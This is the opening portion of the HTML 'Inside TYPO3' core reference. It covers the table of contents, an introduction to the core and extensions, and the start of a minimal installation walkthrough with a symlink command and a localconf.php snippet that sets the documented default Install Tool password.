<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
	<META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=utf-8">
	<TITLE>Inside TYPO3</TITLE>
	<META NAME="GENERATOR" CONTENT="OpenOffice.org 3.1  (Unix)">
	<META NAME="AUTHOR" CONTENT="TYPO3 Core Development Team">
	<META NAME="CREATED" CONTENT="20021101;320000">
	<META NAME="CHANGEDBY" CONTENT="Michael Stucki">
	<META NAME="CHANGED" CONTENT="20081201;1160800">
	<META NAME="CLASSIFICATION" CONTENT="doc_core_inside">
	<META NAME="KEYWORDS" CONTENT="inside, architecture, security, forAdmins, forDevelopers, forIntermediates">
	<META NAME="Author" CONTENT="">
	<META NAME="Email" CONTENT="info@typo3.org">
	<META NAME="Info 1" CONTENT="">
	<META NAME="Info 2" CONTENT="">
	<META NAME="Info 3" CONTENT="">
	<META NAME="Info 4" CONTENT="">
	<META NAME="language (en, de, fr, nl, dk, es, ... )" CONTENT="en">
	<META NAME="SDFOOTNOTE" CONTENT=";;;;P">
	<META NAME="SDENDNOTE" CONTENT="ARABIC">
	<STYLE TYPE="text/css">
	<!--
		@page { margin-left: 2cm; margin-right: 1.3cm; margin-top: 1.8cm; margin-bottom: 0.49cm }
		P { margin-bottom: 0.21cm; color: #000000 }
		P.western { font-family: "Tahoma", sans-serif; font-size: 9pt }
		H1 { margin-top: 2cm; margin-bottom: 1cm; background: transparent; color: #69a550; text-align: left; text-decoration: none; page-break-before: always; page-break-after: auto }
		H1.western { font-family: "Tahoma", sans-serif; font-size: 20pt }
		H1.cjk { font-family: "HG Mincho Light J"; font-size: 13pt }
		H1.ctl { font-family: "Arial Unicode MS"; font-size: 13pt }
		H2 { margin-top: 0.5cm; margin-bottom: 0.1cm; color: #666666; text-align: left; page-break-before: auto; page-break-after: auto }
		H2.western { font-family: "Tahoma", sans-serif; font-size: 20pt; font-style: normal; font-weight: normal }
		H2.cjk { font-family: "HG Mincho Light J"; font-size: 14pt; font-style: italic }
		H2.ctl { font-family: "Arial Unicode MS"; font-size: 14pt; font-style: italic }
		H3 { margin-top: 0.4cm; margin-bottom: 0.1cm; color: #69a550; text-align: left; page-break-before: auto; page-break-after: auto }
		H3.western { font-family: "Tahoma", sans-serif; font-size: 15pt; font-style: normal; font-weight: normal }
		H3.cjk { font-family: "HG Mincho Light J"; font-style: italic }
		H3.ctl { font-family: "Arial Unicode MS"; font-style: italic }
		H4 { margin-top: 0.5cm; margin-bottom: 0.1cm; color: #ff950e; text-align: left; page-break-before: auto; page-break-after: auto }
		H4.western { font-family: "Tahoma", sans-serif; font-size: 11pt; font-style: normal }
		H4.cjk { font-family: "HG Mincho Light J"; font-size: 11pt; font-style: italic }
		H4.ctl { font-family: "Arial Unicode MS"; font-size: 11pt; font-style: italic }
		H5 { margin-top: 0.5cm; margin-bottom: 0.1cm; color: #b84747; text-align: left; page-break-before: auto; page-break-after: auto }
		H5.western { font-family: "Arial", sans-serif; font-size: 9pt; font-style: normal }
		H5.cjk { font-family: "HG Mincho Light J"; font-size: 11pt; font-style: italic }
		H5.ctl { font-family: "Arial Unicode MS"; font-size: 11pt; font-style: italic }
		P.footer-western { margin-bottom: 0.21cm; font-family: "Tahoma", sans-serif; font-size: 8pt; font-weight: normal; line-height: 100%; page-break-before: auto }
		P.footer-cjk { margin-bottom: 0.21cm; line-height: 100%; page-break-before: auto }
		P.footer-ctl { margin-bottom: 0.21cm; line-height: 100%; page-break-before: auto }
		TD P { margin-bottom: 0cm; background: transparent; color: #000000 }
		TD P.western { font-family: "Tahoma", sans-serif; font-size: 8pt }
		TH P { margin-bottom: 0cm; background: #e6e6e6; color: #000000 }
		TH P.western { font-family: "Tahoma", sans-serif; font-size: 9pt; font-style: normal }
		TH P.cjk { font-style: italic }
		TH P.ctl { font-style: italic }
		H2.contents-heading-western { color: #4c4c4c; font-family: "Tahoma", sans-serif; font-size: 16pt; font-style: normal; font-weight: normal }
		H2.contents-heading-cjk { color: #4c4c4c; font-family: "HG Mincho Light J"; font-size: 16pt; font-style: italic }
		H2.contents-heading-ctl { color: #4c4c4c; font-family: "Arial Unicode MS"; font-size: 16pt; font-style: italic }
		PRE { color: #333366; page-break-before: auto }
		PRE.western { font-family: "Courier New", monospace; font-size: 8pt }
		PRE.cjk { font-family: "Cumberland", monospace }
		PRE.ctl { font-family: "Cumberland", monospace }
		A:link { color: #333366; text-decoration: none }
		CODE.western { font-family: "Courier", serif }
		CODE.cjk { font-family: "HG Mincho Light J" }
		CODE.ctl { font-family: "Arial Unicode MS" }
	-->
	</STYLE>
</HEAD>
<BODY LANG="en-US" LINK="#333366" BGCOLOR="#ffffff" DIR="LTR">
<DIV TYPE=HEADER>
	<P CLASS="footer-western" ALIGN=LEFT STYLE="margin-bottom: 0.5cm; font-style: normal">
	<IMG SRC="10_html_4f41537f.gif" ALIGN=LEFT><IMG SRC="10_html_3c9c2593.png" NAME="Grafik2" HSPACE=9 WIDTH=87 HEIGHT=21 BORDER=0>
	<SDFIELD TYPE=DOCINFO SUBTYPE=TITLE>Inside TYPO3</SDFIELD> <SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal">-
	</SPAN></SPAN><SPAN STYLE="font-style: normal"><SPAN STYLE="font-weight: normal"><SDFIELD TYPE=DOCINFO SUBTYPE=THEME>doc_core_inside</SDFIELD></SPAN></SPAN><B>	</B><SPAN STYLE="font-weight: normal"></SPAN><SPAN STYLE="font-weight: normal">
	</SPAN><SPAN STYLE="font-weight: normal">Access Control</SPAN></P>
</DIV>
<P CLASS="western" STYLE="font-style: normal"><BR><BR>
</P>
<H1 CLASS="western" ALIGN=LEFT STYLE="page-break-before: auto; page-break-after: auto"><A NAME="1.Inside TYPO3|outline"></A>
</SPAN><SDFIELD TYPE=DOCINFO SUBTYPE=TITLE>Inside TYPO3</SDFIELD></H1>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">Extension
Key: <SDFIELD TYPE=DOCINFO SUBTYPE=THEME>doc_core_inside</SDFIELD></FONT></P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">Language:
<SDFIELD TYPE=DOCINFO SUBTYPE=CUSTOM NAME="language (en, de, fr, nl, dk, es, ... )">en</SDFIELD></FONT></P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">Keywords:
<SDFIELD TYPE=DOCINFO SUBTYPE=KEYS>inside, architecture, security, forAdmins, forDevelopers, forIntermediates</SDFIELD></FONT></P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">Copyright
2000-2008, <SDFIELD TYPE=DOCINFO SUBTYPE=CUSTOM NAME="Author"></SDFIELD>,
&lt;<SDFIELD TYPE=DOCINFO SUBTYPE=CUSTOM NAME="Email">info@typo3.org</SDFIELD>&gt;</FONT></P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><BR><BR>
</P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">This
document is published under the Open Content License</FONT></P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">available
from http://www.opencontent.org/opl.shtml</FONT></P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><BR><BR>
</P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">The
content of this document is related to TYPO3 </FONT>
</P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">-
a GNU/GPL CMS/Framework available from www.typo3.org<BR></FONT><BR><BR>
</P>
<P CLASS="western" ALIGN=LEFT STYLE="margin-bottom: 0.21cm"><FONT COLOR="#000000">Revised
for TYPO3 4.2, November 2008</FONT></P>
<MULTICOL ID="Table of Contents1" DIR="LTR" COLS=2 GUTTER=19 STYLE="background: #ffffff">
	<DIV ID="Table of Contents1_Head" DIR="LTR">
		<H2 CLASS="contents-heading-western">Table of Contents</H2>
	</DIV>
	<P STYLE="margin-bottom: 0cm; font-weight: normal"><FONT SIZE=3><A HREF="#1.Inside TYPO3|outline">Inside
	TYPO3	1</A></FONT></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#1.1.Introduction|outline">Introduction	3</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#1.1.1.About this document|outline">About
	this document	3</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#1.2.A basic installation|outline">A
	basic installation	4</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#1.2.1.The Backend Adminstration Directory, “typo3/”|outline">The
	Backend Adminstration Directory, “typo3/”	4</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#1.2.2.typo3conf/localconf.php|outline">typo3conf/localconf.php	5</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#1.2.3.The Install Tool|outline">The
	Install Tool	5</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#1.2.4.Basic Core Installation Summary|outline">Basic
	Core Installation Summary	8</A></P>
	<P STYLE="margin-bottom: 0cm; font-weight: normal"><FONT SIZE=3><A HREF="#2.Core Architecture|outline">Core
	Architecture	13</A></FONT></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.1.Backend|outline">Backend	13</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.1.1.Initialization (init.php)|outline">Initialization
	(init.php)	18</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.1.2.Global variables, Constants and Classes|outline">Global
	variables, Constants and Classes	21</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.1.3.The template class (template.php)|outline">The
	template class (template.php)	22</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.1.4.Other reserved global variables|outline">Other
	reserved global variables	24</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.2.Extensions|outline">Extensions	25</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.2.1.What are extensions|outline">What
	are extensions	25</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.2.2.Managing extensions|outline">Managing
	extensions	26</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.3.Configuration|outline">Configuration	28</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.3.1.localconf.php and $TYPO3_CONF_VARS|outline">localconf.php
	and $TYPO3_CONF_VARS	28</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.3.2.config_default.php|outline">config_default.php	29</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.3.3.Install Tool|outline">Install
	Tool	29</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.3.4.Browsing $TYPO3_CONF_VARS values|outline">Browsing
	$TYPO3_CONF_VARS values	30</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.3.5.User and Page TSconfig|outline">User
	and Page TSconfig	31</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.4.Access Control|outline">Access
	Control	32</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.1.Users and groups|outline">Users
	and groups	32</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.2.Roles|outline">Roles	34</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.3.LDAP|outline">LDAP	34</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.4.Access Control options|outline">Access
	Control options	34</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.5.Other options|outline">Other
	options	40</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.6.More about File Mounts|outline">More
	about File Mounts	42</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.7.Setting up a new user|outline">Setting
	up a new user	46</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.4.8.Overview of users|outline">Overview
	of users	53</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.5.Backend Modules|outline">Backend
	Modules	56</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.5.1.Backend Module API|outline">Backend
	Module API	58</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.5.2.conf.php|outline">conf.php	60</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.5.3.The Module script|outline">The
	Module script	64</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.5.4.Backend modules using typo3/mod.php|outline">Backend
	modules using typo3/mod.php	65</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.5.5.Function Menu modules|outline">Function
	Menu modules	66</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.5.6.Creating new backend scripts|outline">Creating
	new backend scripts	68</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.5.7.Initialize TYPO3 backend in a PHP shell script (CLI mode)|outline">Initialize
	TYPO3 backend in a PHP shell script (CLI mode)	68</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.6.Database|outline">Database	70</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.6.1.Introduction|outline">Introduction	70</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.6.2.Relational Database Structure|outline">Relational
	Database Structure	70</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.6.3.Upgrade table/field definitions|outline">Upgrade
	table/field definitions	71</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.7.Versioning and Workspaces|outline">Versioning
	and Workspaces	74</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.7.1.Versioning in TYPO3|outline">Versioning
	in TYPO3	74</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.7.2.Workspaces|outline">Workspaces	76</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.7.3.Using versioning and workspaces |outline">Using
	versioning and workspaces 	79</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.8.Localization|outline">Localization	91</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.1.Strategy|outline">Strategy	91</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.2.Character sets|outline">Character
	sets	91</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.3.How translations are handled by the system|outline">How
	translations are handled by the system	91</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.4.Helping translating TYPO3_|outline">Helping
	translating TYPO3?	92</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.5.Introduce a new language in TYPO3|outline">Introduce
	a new language in TYPO3	92</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.6.Translation teamwork_|outline">Translation
	teamwork?	92</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.7.Distribution of and contribution to language packs|outline">Distribution
	of and contribution to language packs	92</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.8.&quot;locallang-XML&quot; (llXML) files|outline">&quot;locallang-XML&quot;
	(llXML) files	93</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.9.&quot;locallang.php&quot; files (deprecated)|outline">&quot;locallang.php&quot;
	files (deprecated)	94</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.10.&quot;language-splitted&quot; syntax (deprecated)|outline">&quot;language-splitted&quot;
	syntax (deprecated)	96</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.11.How to acquire labels from the $LANG object|outline">How
	to acquire labels from the $LANG object	97</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.8.12.Overriding LOCAL_LANG values|outline">Overriding
	LOCAL_LANG values	98</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.9.Context Sensitive Help (CSH)|outline">Context
	Sensitive Help (CSH)	98</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.9.1.The $TCA_DESCR array|outline">The
	$TCA_DESCR array	99</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.9.2.The locallang files for CSH|outline">The
	locallang files for CSH	101</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.9.3.The CSH pop-up window|outline">The
	CSH pop-up window	102</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.9.4.Implementing CSH for your own tables/fields|outline">Implementing
	CSH for your own tables/fields	103</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.9.5.Implementing CSH in your modules|outline">Implementing
	CSH in your modules	103</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.10.Security in TYPO3|outline">Security
	in TYPO3	105</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.10.1.Default security includes:|outline">Default
	security includes:	105</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.10.2.Additional security measures you can take:|outline">Additional
	security measures you can take:	105</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.10.3.Recommendations|outline">Recommendations	105</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.10.4.PHP settings|outline">PHP
	settings	106</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.10.5.Notice!|outline">Notice!	106</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.10.6.XSS (Cross Site Scripting)|outline">XSS
	(Cross Site Scripting)	106</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.10.7.Security reports|outline">Security
	reports	106</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.11.Files and Directories|outline">Files
	and Directories	111</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.11.1.TYPO3 files and folders|outline">TYPO3
	files and folders	111</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.11.2.Paths in TYPO3 (UNIX vs. Windows):|outline">Paths
	in TYPO3 (UNIX vs. Windows):	111</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.11.3.Filesystem permissions|outline">Filesystem
	permissions	111</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.11.4.Write protection of source code|outline">Write
	protection of source code	112</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.11.5.Changing the default “typo3/” directory|outline">Changing
	the default “typo3/” directory	112</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.12.Core modules|outline">Core
	modules	112</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.12.1.List module|outline">List
	module	112</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.12.2.Info module|outline">Info
	module	114</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.12.3.Access module|outline">Access
	module	114</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.12.4.Functions module|outline">Functions
	module	115</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.12.5.Filelist module|outline">Filelist
	module	115</A></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#2.13.General interface features|outline">General
	interface features	116</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.13.1.Context Sensitive Menus (CSM / &quot;Clickmenu&quot;)|outline">Context
	Sensitive Menus (CSM / &quot;Clickmenu&quot;)	116</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.13.2.Clipboard|outline">Clipboard	117</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#2.13.3.Creating skins for TYPO3|outline">Creating
	skins for TYPO3	122</A></P>
	<P STYLE="margin-bottom: 0cm; font-weight: normal"><FONT SIZE=3><A HREF="#3.Appendix|outline">Appendix	124</A></FONT></P>
	<P STYLE="margin-left: 0.5cm; margin-bottom: 0.21cm"><B><A HREF="#3.1.ImageMagick|outline">ImageMagick	124</A></B></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#3.1.1.Introduction|outline">Introduction	124</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#3.1.2.Filesystem Locations (rpms): |outline">Filesystem
	Locations (rpms): 	124</A></P>
	<P STYLE="margin-left: 1cm; margin-bottom: 0.21cm"><A HREF="#3.1.3.What is wrong with ImageMagick ver. 5+_ |outline">What
	is wrong with ImageMagick ver. 5+? 	124</A></P>
</MULTICOL>
<P CLASS="western"><BR><BR>
</P>
<H2 CLASS="western" STYLE="page-break-before: always"><A NAME="1.1.Introduction|outline"></A>
Introduction</H2>
<H3 CLASS="western"><A NAME="1.1.1.About this document|outline"></A>About
this document</H3>
<P CLASS="western">For most people TYPO3 is equivalent to a CMS
providing a backend for management of the content and a frontend
engine for website display. However TYPO3s core is natively designed
to be a general purpose framework for management of database content.
The core of TYPO3 delivers a set of principles for storage of this
content, user access management, editing of the content, uploading
and managing files etc. Many of these principles are expressed as an
API (Application Programmers Interface) for use in the <I>extensions</I>
which ultimately adds most of the real functionality.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m1db4e20.png" NAME="Graphic5" ALIGN=LEFT WIDTH=669 HEIGHT=712 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">So the <I>core</I> is the skeleton and <I>extensions</I>
are the muscles, fibers and skin making a full bodied CMS. In this
document I cut to the bone and provide a detailed look at the core of
TYPO3 including the API available to the outside. This is supposed to
be the final technical reference apart from source code itself which
is - of course - the ultimate documentation. 
</P>
<H4 CLASS="western">Intended audience</H4>
<P CLASS="western" STYLE="font-weight: normal">This document is
intended to be a reference for experienced TYPO3 developers. For
intermediates it will help you to become experienced! But the
document presumes that you are well familiar with TYPO3 and the
concepts herein. Further it will presume knowledge in the technical
end; PHP, MySQL, Unix etc.</P>
<P CLASS="western"><SPAN STYLE="font-weight: normal">The goal is to
take you &quot;under the hood&quot; of TYPO3. To make the principles
and opportunities clear and less mysterious. To educate you to help
continue the development of TYPO3 along the already established lines
so we will have a consistent CMS application in a future as well.</SPAN>
And hopefully my teaching on the deep technical level will enable you
to educate others higher up in the &quot;hierarchy&quot;. Please
consider that as well!</P>
<H4 CLASS="western">Up-to-date information?</H4>
<P CLASS="western">We are committed to keeping this document
up-to-date. We also want this document and related documents to
contain enough information for you to develop with TYPO3 effectively.
But guess what - in any case the source <I>is </I>updated before <I>this
</I>document is and therefore the <I>ultimate</I> source of both
<SPAN STYLE="font-style: normal">up-to-date </SPAN>information and
<I>more</I> information is peeking into the source scripts! And for
the source scripts we are also trying to keep them well documented. 
</P>
<P CLASS="western">So generally the source code is the final
authority, the final place to look for features and get a precise
picture of function arguments etc. The documentation inside the
source scripts will be short and precise, no examples, not much
explanation. But enough for people knowing what to look for. This
document - an other documents like &quot;<A HREF="/home/shafiq/Sites/typo3/doc_core_api/doc/manual.sxw">TYPO3
Core API</A>&quot; - should provide the greater picture explanations
for use.</P>
<P CLASS="western">If you find that sections in this document are
missing something, please help the author by notifying him and
possibly supply a piece of text which could serve as the supplement
you want to have added. You can also use the annotation feature in
the online version at TYPO3.org.</P>
<P CLASS="western"><B>Notice: </B>TYPO3 version 4 bears a new visual
interface (skin) that is not reflected in the screenshots of this
document. However, this does not have any impact on the content
itself.</P>
<H2 CLASS="western"><A NAME="1.2.A basic installation|outline"></A>A
basic installation</H2>
<P CLASS="western">Since we are dealing with the core of TYPO3 it
might help us to make a totally trimmed down installation of TYPO3
with <I>only</I> the core - then we can see what is actually left...</P>
<P CLASS="western">First of all the general introduction to the
source code file structure is found in the &quot;<A HREF="/home/shafiq/Sites/typo3/doc_inst_upgr/doc/manual.sxw">Installing
and Upgrading</A>&quot; document. So I'll not be going into details
on that here.</P>
<P CLASS="western">For the coming sections in this document I have
made a directory &quot;coreinstall&quot; on the same level as an
installation of the source code. The &quot;coreinstall&quot;
directory is going to be the base directory of the installation (this
path is internally in TYPO3 known as the constant &quot;PATH_site&quot;).
 This is where the website would run from normally.</P>
<PRE CLASS="western">[root@T3dev 32]# ls -la
total 27768
drwxr-xr-x   21 httpd    httpd        4096 Feb 14 14:25 ./
drwxr-xr-x    4 httpd    httpd        4096 Jan 16 19:59 ../
drwxr-xr-x    2 httpd    httpd        4096 Feb 14 14:25 coreinstall/
lrwxrwxrwx    1 httpd    httpd          20 Feb 14 12:05 typo3_src -&gt; typo3_src-3.6.0-dev/
drwxr-xr-x    6 httpd    httpd        4096 Jan 30 17:23 typo3_src-3.6.0-dev/</PRE><P CLASS="western">
<BR><BR>
</P>
<H3 CLASS="western"><A NAME="1.2.1.The Backend Adminstration Directory, “typo3/”|outline"></A>
The Backend Adminstration Directory, “typo3/”</H3>
<P CLASS="western">In the directory &quot;coreinstall/&quot; I create
a symlink to the typo3/ administration directory:</P>
<PRE CLASS="western"># ln -s ../typo3_src/typo3/</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">The lets see what happens if I point my web
browser at this directory:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m2c4a63c8.png" NAME="Graphic6" ALIGN=LEFT WIDTH=482 HEIGHT=127 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">Yes of course - the configuration directory.
&quot;typo3conf/&quot; is a <I>local</I> directory which contains
<I>site specific</I> files. That can be locally installed extensions,
special scripts, special all kinds of things and of course the
obligatory &quot;localconf.php&quot; file! In other words: The
&quot;typo3conf/&quot; folder of a TYPO3 installation contains <I>local,
unique files </I>for the website while the &quot;typo3/&quot; folder
(along with others) contains <I>general source code</I> that could
have been shared between all installations on a server. Well, read
more about this in the <A HREF="/home/shafiq/Sites/typo3/doc_inst_upgr/doc/manual.sxw#Verbose%20Install%7Coutline">Installing
and Upgrading</A> document.</P>
<H3 CLASS="western"><A NAME="1.2.2.typo3conf/localconf.php|outline"></A>
typo3conf/localconf.php</H3>
<P CLASS="western">Lets create a localconf.php file:</P>
<PRE CLASS="western"><CODE CLASS="western"><FONT COLOR="#0000bb">&lt;?php<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Setting the Install Tool password to the default &quot;joh316&quot;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;BE&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;installToolPassword&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">]&nbsp;=&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;bacb98acf97e0b6112b1d1b650b84971&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Setting the list of extensions to BLANK (by default there is a long list set)<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT 